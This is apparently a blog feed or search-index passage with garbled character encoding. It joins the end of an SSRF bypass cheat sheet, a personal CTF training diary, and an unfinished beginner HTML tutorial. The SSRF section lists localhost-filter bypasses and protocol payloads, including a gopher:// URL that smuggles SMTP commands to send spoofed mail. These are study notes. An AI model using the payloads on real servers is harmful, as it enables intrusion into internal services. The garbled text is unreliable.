<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="ä»»æ„æŒ‡å‘-xip-io"><a href="#ä»»æ„æŒ‡å‘-xip-io" class="headerlink" title="ä»»æ„æŒ‡å‘(xip.io)"></a>ä»»æ„æŒ‡å‘(xip.io)</h3><pre><code class="highlight plaintext">http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/</code></pre>

<h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨[::]"></a>åˆ©ç”¨[::]</h3><pre><code class="highlight plaintext">åˆ©ç”¨[::]ç»•è¿‡localhost 
http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre>

<h3 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨@"></a>åˆ©ç”¨@</h3><pre><code class="highlight plaintext">http://example.com@127.0.0.1</code></pre>

<h3 id="åˆ©ç”¨çŸ­é“¾æ¥"><a href="#åˆ©ç”¨çŸ­é“¾æ¥" class="headerlink" title="åˆ©ç”¨çŸ­é“¾æ¥"></a>åˆ©ç”¨çŸ­é“¾æ¥</h3><pre><code class="highlight plaintext">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1
http://sudo.cc &gt;&gt;&gt;http://127.0.0.1</code></pre>

<h3 id="ä¿®æ”¹ç±»å‹"><a href="#ä¿®æ”¹ç±»å‹" class="headerlink" title="ä¿®æ”¹ç±»å‹"></a>ä¿®æ”¹ç±»å‹</h3><pre><code class="highlight plaintext">ä¿®æ”¹&quot;type=file&quot;ä¸º&quot;type=url&quot;
æ¯”å¦‚ï¼š
ä¸Šä¼ å›¾ç‰‡å¤„ä¿®æ”¹ä¸Šä¼ ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘SSRF</code></pre>

<h3 id="åˆ©ç”¨Enclosed-alphanumerics"><a href="#åˆ©ç”¨Enclosed-alphanumerics" class="headerlink" title="åˆ©ç”¨Enclosed alphanumerics"></a>åˆ©ç”¨Enclosed alphanumerics</h3><pre><code class="highlight plaintext">åˆ©ç”¨Enclosed alphanumerics
â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  example.com
List:
â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ 
â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ 
â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› 
â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ 
â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ 
â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© 
â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ 
â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</code></pre>

<h3 id="åˆ©ç”¨å¥å·"><a href="#åˆ©ç”¨å¥å·" class="headerlink" title="åˆ©ç”¨å¥å·"></a>åˆ©ç”¨å¥å·</h3><pre><code class="highlight plaintext">127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1</code></pre>

<h3 id="åˆ©ç”¨è¿›åˆ¶è½¬æ¢"><a href="#åˆ©ç”¨è¿›åˆ¶è½¬æ¢" class="headerlink" title="åˆ©ç”¨è¿›åˆ¶è½¬æ¢"></a>åˆ©ç”¨è¿›åˆ¶è½¬æ¢</h3><pre><code class="highlight plaintext">ä¾‹å¦‚192.168.0.1
C0 A8 00 01
8 è¿›åˆ¶æ ¼å¼ï¼š0300.0250.0.1
16 è¿›åˆ¶æ ¼å¼ï¼š0xC0.0xA8.0.1
10 è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š3232235521
16 è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š0xC0A80001
è¿˜æœ‰ä¸€ç§ç‰¹æ®Šçš„çœç•¥æ¨¡å¼ï¼Œä¾‹å¦‚10.0.0.1è¿™ä¸ª IP å¯ä»¥å†™æˆ10.1

127.0.0.1=&gt;7F 00 00 01
å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ã€‚
115.239.210.26  &gt;&gt;&gt;  16373751032
é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1a
ç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ8è¿›åˆ¶
è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0 è·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0x</code></pre>

<h3 id="åˆ©ç”¨åè®®"><a href="#åˆ©ç”¨åè®®" class="headerlink" title="åˆ©ç”¨åè®®"></a>åˆ©ç”¨åè®®</h3><pre><code class="highlight plaintext">Dict://
dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</code></pre>



]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>AyaN0æ¡‘çš„é›†è®­é˜¶æ®µæ€»ç»“</title>
    <url>/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="é›†è®­æ€»ç»“"><a href="#é›†è®­æ€»ç»“" class="headerlink" title="é›†è®­æ€»ç»“"></a>é›†è®­æ€»ç»“</h1><p>æƒ³æƒ³ä¸€ä¸ªæœˆå­¦äº†ä»€ä¹ˆå‘¢ã€‚</p>
<p>å¥½åƒå­¦äº†å¾ˆå¤šï¼Œå¥½åƒåˆæ²¡å­¦åˆ°ä»€ä¹ˆã€‚(å› ä¸ºNepCTFè¢«é”¤çƒ‚äº†å•Šè‰)</p>
<p>ç®€å•çš„æ€»ç»“ä¸€ä¸‹å­¦åˆ°çš„ä¸œè¥¿å§ã€‚</p>
<h2 id="æ¸—é€"><a href="#æ¸—é€" class="headerlink" title="æ¸—é€"></a>æ¸—é€</h2><p>å­¦åˆ°äº†ä»€ä¹ˆã€‚ã€‚</p>
<p>å¥½åƒå°±ä¼šäº†æ­ä»£ç†ï¼Œæ‰«ç«¯å£ï¼ŒæŸ¥èµ„äº§</p>
<p>æ€»ä¹‹æ²¡æ€ä¹ˆå­¦ï¼Œåªæœ‰è€ç™»è®²è¯¾çš„é‚£å‡ æ¬¡å­¦äº†ç‚¹è¿›å»æ¥ç€</p>
<p>å…«æœˆå†è¯´å§å”‰â€¦</p>
<h2 id="PHPæ—¶ä»£çš„ç»“æŸ"><a href="#PHPæ—¶ä»£çš„ç»“æŸ" class="headerlink" title="PHPæ—¶ä»£çš„ç»“æŸ"></a>PHPæ—¶ä»£çš„ç»“æŸ</h2><p>æ€»ç®—æŠŠPHPçš„çŸ¥è¯†ç‚¹è¡¥å®Œäº†ã€‚è™½ç„¶ä¸­é€”è·‘å‡ºæ¥çš„R3CTFåˆæŠŠæˆ‘é”¤çƒ‚äº†(æƒ³åˆ°äº†heredocä¸çŸ¥é“æ€ä¹ˆå†™pocâ€¦DIRECTORY_SEPARATORæ˜¯ä»€ä¹ˆ?æˆ‘ä¸åˆ°å•Š)</p>
<p>è¿˜å€Ÿç€è¡¥å®ŒåŸç”Ÿç±»çš„åŠŸå¤«æŠŠCRLFå’ŒHTTPè¯·æ±‚èµ°ç§ï¼Œå‘ç°è‡ªå·±å¯¹HTTPåè®®å¥½åƒçœŸçš„æœ‰ç‚¹ä¸å¤ªäº†è§£å•Šã€‚ã€‚</p>
<p>ä½†æ˜¯çœŸç»“æŸäº†å—?æˆ‘çœ‹å¹¶é</p>
<p>ä»¥åå¤§æ¦‚è¿˜æ˜¯è¦ä¸æ–­è¡¥å‘çš„</p>
<h2 id="å¥‡å¥‡æ€ªæ€ªçš„å…¶ä»–è¯­è¨€"><a href="#å¥‡å¥‡æ€ªæ€ªçš„å…¶ä»–è¯­è¨€" class="headerlink" title="å¥‡å¥‡æ€ªæ€ªçš„å…¶ä»–è¯­è¨€"></a>å¥‡å¥‡æ€ªæ€ªçš„å…¶ä»–è¯­è¨€</h2><p>æ˜¥ç§‹æ¯é‡åˆ°äº†rubyï¼Œä¹‹åå°±éšä¾¿å­¦äº†ç‚¹å…¶ä»–çš„è¯­è¨€</p>
<p>åƒRuby,Goè¿™äº›</p>
<p>Goçš„é¢˜ç›®è¿˜æ²¡æ¥è§¦è¿‡ï¼Œæ¥è§¦åˆ°äº†å†æ·±å…¥å­¦å§ï¼Œrubyçš„é¢˜ç›®å°‘ï¼ŒçŸ¥è¯†ç‚¹ä¹Ÿå°‘ï¼Œå€’æ˜¯æ²¡å¤ªå¤§æ‰€è°“</p>
<h2 id="æ›´å¤šæ›´å¤šçš„æ¡†æ¶"><a href="#æ›´å¤šæ›´å¤šçš„æ¡†æ¶" class="headerlink" title="æ›´å¤šæ›´å¤šçš„æ¡†æ¶"></a>æ›´å¤šæ›´å¤šçš„æ¡†æ¶</h2><p>PHPçš„Yiiï¼Œæ²¡é‡åˆ°è¿‡..Laravelï¼Ÿä¸è®¤è¯†</p>
<p>Pythonçš„sanicæ˜¯ä»€ä¹ˆ?pyramidåˆæ˜¯å•¥?</p>
<p>å“å‘¦æˆ‘ï¼Œæ€ä¹ˆä»€ä¹ˆéƒ½ä¸çŸ¥é“å•ŠğŸ–ï¸ğŸ˜­ğŸ–ï¸</p>
<p>æœ€é£èˆçš„ä¸€é›†</p>
<h2 id="ã€ŠJSè‹¦æ‰‹ã€‹"><a href="#ã€ŠJSè‹¦æ‰‹ã€‹" class="headerlink" title="ã€ŠJSè‹¦æ‰‹ã€‹"></a>ã€ŠJSè‹¦æ‰‹ã€‹</h2><p>åŸå‹é“¾?å“¦ä¼šçš„ä¼šçš„</p>
<p>vmæ²™ç®±?å“¦åº”è¯¥ä¼šçš„ä¼šçš„</p>
<p>XSS?æˆ‘è‰æ‹Ÿå—å¸¦ç€ä½ çš„ä¸€å †è´­æœºå§æ ‡ç­¾ç»™æˆ‘æ»šå‡ºå»ğŸ˜¡</p>
<h2 id="Javaå¤§æ—¶ä»£è¦æ¥åŠ›"><a href="#Javaå¤§æ—¶ä»£è¦æ¥åŠ›" class="headerlink" title="Javaå¤§æ—¶ä»£è¦æ¥åŠ›"></a>Javaå¤§æ—¶ä»£è¦æ¥åŠ›</h2><p>Nepå¶é‡ä¸‰é“Javaé¢˜ï¼Œæ‹¼å°½å…¨åŠ›æˆ˜èƒœ(ä½†æ˜¯è¯´å®è¯æ˜¯ç­¾åˆ°é¢˜å§å‘)</p>
<p>æ„Ÿè§‰æ˜¯åº”è¯¥å­¦Javaäº†å•Šï¼Œæ¯•ç«ŸGoå’ŒRubyå¶å°”ä¸Šæ¡Œï¼Œè¿™ä½å¯æ˜¯å¤©å¤©ä¸Šæ¡Œ</p>
<p>ä¸€å¬åˆ°å…¶ä»–å¸ˆå‚…åœ¨ç ”ç©¶å„ç§å†·é—¨çš„ç¥ç§˜é“¾å­å·²ç»å“å“­äº†ã€‚ã€‚</p>
<h2 id="ä½ çœŸçš„æ‡‚æ•°æ®åº“å—"><a href="#ä½ çœŸçš„æ‡‚æ•°æ®åº“å—" class="headerlink" title="ä½ çœŸçš„æ‡‚æ•°æ®åº“å—"></a>ä½ çœŸçš„æ‡‚æ•°æ®åº“å—</h2><p>æ„Ÿè§‰æ•°æ®åº“å¥½å¤šï¼Œå¥½åƒéšä¾¿æªä¸€ä¸ªå‡ºæ¥éƒ½å¯ä»¥å‡ºé¢˜ã€‚</p>
<p>å­¦äº†ä¸€ç‚¹Rediså’ŒMongoDBè¿™ç§NoSQL</p>
<p>ç»“æœæœˆæœ«è¢«Nepçš„<code>clickhouse</code>SQLæ³¨å…¥ç»™æ‰“çˆ†äº†</p>
<p>è¿™è¾ˆå­ä¸æ•¢è¯´è‡ªå·±ä¼šSQLæ³¨å…¥äº†ã€‚</p>
<p>æ„Ÿè§‰åº”è¯¥å°±å­¦äº†è¿™äº›å§ï¼Œä¸€ä¸ªæœˆçš„æ—¶é—´ï¼Œä¹Ÿä¸æ•¢è¯´è‡ªå·±æŒæ¡çš„æœ‰å¤šæ·±å…¥</p>
<p>å¸Œæœ›é˜Ÿå†…èµ›ä¸ä¼šçˆ†é›¶å§ã€‚ã€‚ä¹Ÿä¸çŸ¥é“è€ç™»çš„è‘«èŠ¦é‡Œå–çš„ä»€ä¹ˆè¯</p>
<p>æ„Ÿè§‰è‡ªå·±æœ€æ¬ ç¼ºçš„åº”è¯¥æ˜¯ååºåˆ—åŒ–è¿™å—å§ã€‚é“¾å­ä»€ä¹ˆçš„çœ‹ä¸æ‡‚å•¦â€¦â€¦</p>
<h2 id="è´¥åŒ—çš„AyaN0"><a href="#è´¥åŒ—çš„AyaN0" class="headerlink" title="è´¥åŒ—çš„AyaN0"></a>è´¥åŒ—çš„AyaN0</h2><p>å¿˜è®°å‘å¸ƒäº†ï¼Œç­‰åˆ°çœ‹åˆ°è¿™ä¸ªé˜Ÿå†…èµ›å·²ç»æ‰“å®Œäº†ï¼Œçˆ†é›¶äº†å“ˆå“ˆã€‚ã€‚</p>
<p>å¼ºåº¦ç¡®å®ä¸å¤Ÿçœ‹äº†ï¼Œç°åœ¨ä»”ç»†çœ‹çœ‹è‡ªå·±ä¸Šé¢åˆ—çš„è¿™äº›ä¸œè¥¿æ„Ÿè§‰æœ‰ç‚¹åƒç¬‘è¯</p>
<p>è¿˜æ˜¯å¤ªå¿ƒæ€¥äº†å—ã€‚ã€‚çœŸæ­£ç¢°åˆ°æ¯”èµ›æ‰çŸ¥é“è‡ªå·±åªæ˜¯å­¦äº†ä¸ªçŸ¥è¯†ç‚¹ï¼Œæ€ä¹ˆæ‰“éƒ½æ˜¯ä¸€çŸ¥åŠè§£ï¼Œåˆæ²¡æœ‰è‡ªå·±çš„æ€è·¯</p>
<p>å”‰å”‰ï¼Œè¦å¥½å¥½åæ€è‡ªå·±ï¼Œå¥½åœ¨åç»­æˆåŠŸå¤ç°äº†ï¼Œè¿˜æ˜¯å¤šç§æ–¹æ³•å»æ‰“ï¼Œä¸å­¦çš„æ·±å…¥ä¸€ç‚¹è¿˜çœŸæ˜¯æ²¡åŠæ³•ä¸Šæ¡Œçš„ï¼Œç®€ç›´æ˜¯ä¼šå‘˜åˆ¶é¤å…é‡Œç«¯ä¸Šæ¥çš„ä¸€ä¸ªä¸€ä¸ªé›ª(éš¾è§†)</p>
<p>å¥½é¢˜ç›®ä¹Ÿå¯ä»¥å¤šè‡ªå·±ç ”ç©¶ä¸€ä¸‹å•Šæ„Ÿè§‰(è¿™æ¬¡é˜Ÿå†…èµ›çš„é¢˜ç›®æ„Ÿè§‰éƒ½æŒºå¥½çš„ï¼Œå…¨æ˜¯æˆ‘æŒæ¡çš„ä¸å…¨é¢çš„ä¸œè¥¿ã€‚ã€‚)</p>
<p>ä½†æ˜¯è®²å®è¯ï¼Œé˜Ÿå†…èµ›ç»“æŸ é‚£ä¸ªæ™šä¸Šåˆ°1ç‚¹æ‰ç¡ç€ï¼Œå’Œè€åŒå­¦ä¹ŸèŠäº†å¥½ä¹…ï¼Œæ€€ç–‘è¿‡è‡ªå·±é€‚ä¸é€‚åˆæ‰“webï¼Œé€‚ä¸é€‚åˆç»§ç»­æ‰“CTFï¼Œè´¨ç–‘è¿‡è‡ªå·±çš„èƒ½åŠ›</p>
<p>ä½†æ˜¯å°±ç®—æ²¡æœ‰æ‰èƒ½åˆå¦‚ä½•å‘¢ã€‚ã€‚åšå®šä¸ç§»çš„èµ°è‡ªå·±å–œæ¬¢çš„é“è·¯å°±å¥½äº†</p>
<p>é¢ï¼Œä½†æ˜¯ä½ æ€ä¹ˆçŸ¥é“æˆ‘æ˜¨å¤©å•æŠ½ä¸¤ä¸ªupğŸ˜‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125708921.png" alt="image-20250802125708921"></p>
<p>å’Œ<del>è€ç­é•¿</del>ä¹‰çˆ¶çš„ç›¸è°ˆ</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125911183.png" alt="image-20250802125911183"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125924247.png" alt="image-20250802125924247"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802130053483.png" alt="image-20250802130053483"></p>
<p>19å‘å•æŠ½æ‹¿ä¸‹å½“æœŸ2ä¸ªupå˜»å˜»ï¼Œçˆ½èµ¤äº†</p>
]]></content>
      <tags>
        <tag>-éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title>HTMLå­¦ä¹ ä»¥åŠç½‘é¡µæ­å»ºåˆå®è·µ</title>
    <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h1 id="HTMLå­¦ä¹ ä»¥åŠç½‘é¡µæ­å»ºåˆå®è·µ"><a href="#HTMLå­¦ä¹ ä»¥åŠç½‘é¡µæ­å»ºåˆå®è·µ" class="headerlink" title="HTMLå­¦ä¹ ä»¥åŠç½‘é¡µæ­å»ºåˆå®è·µ"></a>HTMLå­¦ä¹ ä»¥åŠç½‘é¡µæ­å»ºåˆå®è·µ</h1><p>å­¦XSSä¸€å¤§å®¶å­æ—¶å‘ç°å‰ç«¯ä¸ä»”ç»†äº†è§£ä¸€ä¸‹å­¦ä¹ å¾ˆéš¾è¿›è¡Œä¸‹å»å•Šï¼Œäºæ˜¯å°±æƒ³å…ˆç®€å•å­¦ä¹ ä¸€ä¸‹htmlæ¥åšä¸€ä¸ªé“ºå«</p>
<h2 id="HTMLå®ä¾‹çš„åŸºæœ¬ç»“æ„"><a href="#HTMLå®ä¾‹çš„åŸºæœ¬ç»“æ„" class="headerlink" title="HTMLå®ä¾‹çš„åŸºæœ¬ç»“æ„"></a>HTMLå®ä¾‹çš„åŸºæœ¬ç»“æ„</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03"></p>
<ul>
<li><strong><!DOCTYPE html></strong> å£°æ˜ä¸º HTML5 æ–‡æ¡£</li>
<li><strong><html></html></strong> å…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´ </li>
<li><strong><head></head></strong> å…ƒç´ åŒ…å«äº†æ–‡æ¡£çš„å…ƒï¼ˆmetaï¼‰æ•°æ®ï¼Œå¦‚ <strong><meta charset="utf-8"></strong> å®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º <strong>utf-8</strong>ã€‚</li>
<li><strong><title></title></strong> å…ƒç´ æè¿°äº†æ–‡æ¡£çš„æ ‡é¢˜</li>
<li><strong><body></body></strong> å…ƒç´ åŒ…å«äº†å¯è§çš„é¡µé¢å†…å®¹</li>
<li><strong><h1></h1></strong> å…ƒç´ å®šä¹‰ä¸€ä¸ªå¤§æ ‡é¢˜</li>
<li><strong><p></p></strong> å…ƒç´ å®šä¹‰ä¸€ä¸ªæ®µè½</li>
</ul>
<p>å…¶å®F12æŸ¥ä¸€ä¸‹æºä»£ç å°±èƒ½çŸ¥é“æ˜¯å¤§è‡´æ€ä¹ˆæ ·ä¸ªç»“æ„</p>
<h2 id="ä»€ä¹ˆæ˜¯-HTML"><a href="#ä»€ä¹ˆæ˜¯-HTML" class="headerlink" title="ä»€ä¹ˆæ˜¯ HTML?"></a>ä»€ä¹ˆæ˜¯ HTML?</h2><p>HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ã€‚</p>
<ul>
<li>HTML æŒ‡çš„æ˜¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</li>
<li>HTML ä¸æ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œè€Œæ˜¯ä¸€ç§<strong>æ ‡è®°</strong>è¯­è¨€</li>
<li>æ ‡è®°è¯­è¨€æ˜¯ä¸€å¥—<strong>æ ‡è®°æ ‡ç­¾</strong> (markup tag)</li>
<li>HTML ä½¿ç”¨æ ‡è®°æ ‡ç­¾æ¥<strong>æè¿°</strong>ç½‘é¡µ</li>
<li>HTML æ–‡æ¡£åŒ…å«äº†HTML <strong>æ ‡ç­¾</strong>åŠ<strong>æ–‡æœ¬</strong>å†…å®¹</li>
<li>HTMLæ–‡æ¡£ä¹Ÿå«åš <strong>web é¡µé¢</strong></li>
</ul>
<h2 id="HTML-æ ‡ç­¾"><a href="#HTML-æ ‡ç­¾" class="headerlink" title="HTML æ ‡ç­¾"></a>HTML æ ‡ç­¾</h2><p>HTML æ ‡è®°æ ‡ç­¾é€šå¸¸è¢«ç§°ä¸º HTML æ ‡ç­¾ (HTML tag)ã€‚</p>
<ul>
<li>HTML æ ‡ç­¾æ˜¯ç”±<em>å°–æ‹¬å·</em>åŒ…å›´çš„å…³é”®è¯ï¼Œæ¯”å¦‚ <html></html></li>
<li>HTML æ ‡ç­¾é€šå¸¸æ˜¯<em>æˆå¯¹å‡ºç°</em>çš„ï¼Œæ¯”å¦‚ <b> å’Œ </b></li>
<li>æ ‡ç­¾å¯¹ä¸­çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾æ˜¯<em>å¼€å§‹æ ‡ç­¾</em>ï¼Œç¬¬äºŒä¸ªæ ‡ç­¾æ˜¯<em>ç»“æŸæ ‡ç­¾</em></li>
<li>å¼€å§‹å’Œç»“æŸæ ‡ç­¾ä¹Ÿè¢«ç§°ä¸º<em>å¼€æ”¾æ ‡ç­¾</em>å’Œ<em>é—­åˆæ ‡ç­¾</em></li>
</ul>
<p>&lt;æ ‡ç­¾&gt;å†…å®¹&lt;&#x2F;æ ‡ç­¾&gt;</p>
<hr>
<h2 id="HTML-å…ƒç´ "><a href="#HTML-å…ƒç´ " class="headerlink" title="HTML å…ƒç´ "></a>HTML å…ƒç´ </h2><p>â€œHTML æ ‡ç­¾â€ å’Œ â€œHTML å…ƒç´ â€ é€šå¸¸éƒ½æ˜¯æè¿°åŒæ ·çš„æ„æ€.</p>
<p>ä½†æ˜¯ä¸¥æ ¼æ¥è®², ä¸€ä¸ª HTML å…ƒç´ åŒ…å«äº†å¼€å§‹æ ‡ç­¾ä¸ç»“æŸæ ‡ç­¾ï¼Œå¦‚ä¸‹å®ä¾‹:</p>
<p>HTML å…ƒç´ :</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<h3 id><a href="#" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>å†…å®¹åˆ’åˆ†å…ƒç´ ï¼Œé€šè¿‡divä¸classçš„æ­é…è½»æ¾å°†é¡µé¢åˆ’åˆ†ä¸ºå¤šä¸ªä¸åŒæ¨¡å—</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;a&gt;"></a><code>&lt;a&gt;</code></h3><p>é”šå…ƒç´ ï¼Œé€šè¿‡å…¶çš„herfå±æ€§æ¥å¼•ç”¨å…¶ä»–ç½‘é¡µ&#x2F;æœ¬åœ°çš„æ–‡ä»¶</p>
<ul>
<li><p>å®ä¾‹</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.mozilla.com&quot;&gt; Mozilla &lt;/a&gt; 
//ç»å¯¹åœ°å€å¼•ç”¨
&lt;a href=&quot;//example.com&quot;&gt;ç›¸å¯¹äºåè®®çš„ URL&lt;/a&gt;
&lt;a href=&quot;/zh-CN/docs/Web/HTML&quot;&gt;ç›¸å¯¹äºæºçš„ URL&lt;/a&gt;
&lt;a href=&quot;./p&quot;&gt;ç›¸å¯¹äºè·¯å¾„çš„ URL&lt;/a&gt;
//ç›¸å¯¹åœ°å€çš„é“¾æ¥
&lt;!-- &lt;a&gt; å…ƒç´ é“¾æ¥åˆ°ä¸‹é¢éƒ¨åˆ† --&gt;
&lt;p&gt;&lt;a href=&quot;#Section_further_down&quot;&gt; è·³è½¬åˆ°ä¸‹æ–¹æ ‡é¢˜ &lt;/a&gt;&lt;/p&gt;

&lt;!-- è¦é“¾æ¥åˆ°çš„æ ‡é¢˜ --&gt;
&lt;h2 id=&quot;Section_further_down&quot;&gt;æ›´ä¸‹é¢çš„éƒ¨åˆ†&lt;/h2&gt;
//åŒé¡µé¢é“¾æ¥</code></pre>

<p>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å°†<code>&lt;a&gt;</code>æ’å…¥åœ¨æ®µè½ä¸­è¾¾åˆ°å¼•ç”¨çš„æ•ˆæœ</p>
<h3 id="å¾…è¡¥å…¨ä¸­ã€‚ã€‚ã€‚"><a href="#å¾…è¡¥å…¨ä¸­ã€‚ã€‚ã€‚" class="headerlink" title="(å¾…è¡¥å…¨ä¸­ã€‚ã€‚ã€‚)"></a>(å¾…è¡¥å…¨ä¸­ã€‚ã€‚ã€‚)</h3></li>
</ul>
<h2 id="ç½‘é¡µç»“æ„"><a href="#ç½‘é¡µç»“æ„" class="headerlink" title="ç½‘é¡µç»“æ„"></a>ç½‘é¡µç»“æ„</h2><p>ä¸€èˆ¬åˆ†ä¸ºheadå’Œbody</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">html</span>&gt;</span>
	<span class="tag">&lt;<span class="name">head</span>&gt;</span>
    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>æ ‡é¢˜<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
	<span class="tag">&lt;<span class="name">body</span>&gt;</span>
        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>å°æ ‡é¢˜<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
        <span class="tag">&lt;<span class="name">p</span>&gt;</span>æ­£æ–‡<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>

<p>åªæœ‰bodyéƒ¨åˆ†ä¼šåœ¨ç½‘é¡µä¸­æ˜¾ç¤º</p>
<h2 id="HTMLç‰ˆæœ¬"><a href="#HTMLç‰ˆæœ¬" class="headerlink" title="HTMLç‰ˆæœ¬"></a>HTMLç‰ˆæœ¬</h2><p>ä»åˆæœŸçš„ç½‘ç»œè¯ç”Ÿåï¼Œå·²ç»å‡ºç°äº†è®¸å¤šHTMLç‰ˆæœ¬:</p>
<table>
<thead>
<tr>
<th align="left">ç‰ˆæœ¬</th>
<th align="left">å‘å¸ƒæ—¶é—´</th>
</tr>
</thead>
<tbody><tr>
<td align="left">HTML</td>
<td align="left">1991</td>
</tr>
<tr>
<td align="left">HTML+</td>
<td align="left">1993</td>
</tr>
<tr>
<td align="left">HTML 2.0</td>
<td align="left">1995</td>
</tr>
<tr>
<td align="left">HTML 3.2</td>
<td align="left">1997</td>
</tr>
<tr>
<td align="left">HTML 4.01</td>
<td align="left">1999</td>
</tr>
<tr>
<td align="left">XHTML 1.0</td>
<td align="left">2000</td>
</tr>
<tr>
<td align="left">HTML5</td>
<td align="left">2012</td>
</tr>
<tr>
<td align="left">XHTML5</td>
